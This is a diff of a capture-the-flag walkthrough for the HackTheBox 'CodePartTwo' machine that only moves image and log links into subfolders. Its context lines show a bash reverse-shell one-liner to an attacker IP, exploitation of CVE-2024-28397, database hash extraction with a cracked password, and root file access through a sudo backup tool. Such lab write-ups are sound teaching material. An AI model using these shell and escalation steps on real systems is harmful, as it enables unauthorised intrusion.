@@ -1,6 +1,6 @@
 # CodePartTwo — HTB Walkthrough
 
-![CodePartTwo Machine](codePartTwo.png)
+![CodePartTwo Machine](images/codePartTwo.png)
 
 **Status:** Completed  
 **Difficulty:** Easy  
@@ -33,7 +33,7 @@ nmap -sC -sV -p- 10.10.11.82
 - `-p-` - Scan ALL ports (1-65535) instead of just common ones
 - `10.10.11.82` - The target IP address we're scanning
 
-**Raw Log:** [nmap.txt](nmap.txt)
+**Raw Log:** [nmap.txt](raw-logs/nmap.txt)
 
 **Output Excerpt:**
 ```
@@ -48,7 +48,7 @@ PORT     STATE SERVICE VERSION
 
 **Why this matters:** The web application on port 8000 is unusual (typically web apps run on port 80 or 443), which suggests it might be a custom application that could have vulnerabilities.
 
-![Nmap scan results](nmap.png)
+![Nmap scan results](images/nmap.png)
 
 ### Step 2: Web Application Reconnaissance
 
@@ -78,7 +78,7 @@ The web application is a custom-built platform that has a feature allowing users
 
 **Why this matters:** Having access to source code dramatically increases our chances of finding vulnerabilities. It's like having the blueprint to a building before trying to break in.
 
-![Web application interface](codePartTwo.png)
+![Web application interface](images/codePartTwo.png)
 
 ### Step 3: Directory Enumeration with Dirsearch
 
@@ -103,7 +103,7 @@ The scan revealed several interesting endpoints:
 
 **Why this matters:** Knowing all available endpoints helps us understand the application's structure and identify potential entry points for our attack.
 
-![Dirsearch results](dirsearch.png)
+![Dirsearch results](images/dirsearch.png)
 
 ### Step 4: Vulnerability Scanning with Nuclei
 
@@ -124,7 +124,7 @@ The automated scan didn't reveal any critical vulnerabilities. This is actually 
 
 **Important lesson:** Just because automated tools don't find anything doesn't mean the application is secure. Manual code review and testing often reveal issues that scanners miss. This is why we downloaded the source code in Step 2.
 
-![Nuclei scan results](nuclei.png)
+![Nuclei scan results](images/nuclei.png)
 
 ### Step 5: Source Code Analysis
 
@@ -139,7 +139,7 @@ The automated scan didn't reveal any critical vulnerabilities. This is actually 
 **What we found:**
 The application's structure revealed it's using specific libraries and frameworks. After examining the code and checking the dependencies, we identified that the application is vulnerable to **CVE-2024-28397** - a Remote Code Execution vulnerability.
 
-![Application tree structure](app_tree.png)
+![Application tree structure](images/app_tree.png)
 
 **Understanding CVE-2024-28397:**
 - **CVE** stands for Common Vulnerabilities and Exposures - a public database of security flaws
@@ -151,9 +151,9 @@ The application's structure revealed it's using specific libraries and framework
 2. Check if the application version matches the vulnerable version
 3. Confirm the vulnerability exists before attempting exploitation
 
-![CVE research](cve.png)
+![CVE research](images/cve.png)
 
-![CVE verification - Confirmed vulnerable](cve_is_ok.png)
+![CVE verification - Confirmed vulnerable](images/cve_is_ok.png)
 
 **Why this matters:** Finding a known CVE is significant because it means there's likely public documentation and possibly even ready-made exploits we can use. This dramatically reduces the time needed to compromise the system.
 
@@ -198,7 +198,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.120/4444 0>&1'
 **What happened:**
 After sending the exploit, our netcat listener received a connection! We now have shell access to the target machine as the web application user.
 
-![Exploit execution](exploit.png)
+![Exploit execution](images/exploit.png)
 
 ### Step 7: Database Credential Extraction
 
@@ -238,7 +238,7 @@ The application stores user credentials in a database file. We discovered user `
 - To use this hash, we need to "crack" it - try to find what password creates this hash
 - This hash appears to be MD5 format (32 hexadecimal characters)
 
-![Marco's hash in database](marco_hash.png)
+![Marco's hash in database](images/marco_hash.png)
 
 ### Step 8: Password Cracking
 
@@ -276,7 +276,7 @@ Password: `iambatman`
 
 **What this means:** The user `marco` is using "iambatman" as their password - a weak password that was easily cracked because it's a common phrase.
 
-![Password cracking success](marco_pass.png)
+![Password cracking success](images/marco_pass.png)
 
 ### Step 9: SSH Access and User Flag
 
@@ -288,7 +288,7 @@ cat ~/user.txt
 
 **Output:** User flag captured.
 
-![User flag](user_flag.png)
+![User flag](images/user_flag.png)
 
 ---
 
@@ -328,7 +328,7 @@ sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshots
 
 **Analysis:** Created backup of root directory using modified config.
 
-![Configuration modification](gnu_root.png)
+![Configuration modification](images/gnu_root.png)
 
 ### Step 12: Root Flag Extraction via Snapshot
 
@@ -343,7 +343,7 @@ sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id <snapshot-id> --du
 
 **Output:** Root flag successfully extracted from backup snapshot.
 
-![Snapshot contents and flag extraction](snapshot.png)
+![Snapshot contents and flag extraction](images/snapshot.png)
 
 ---
 
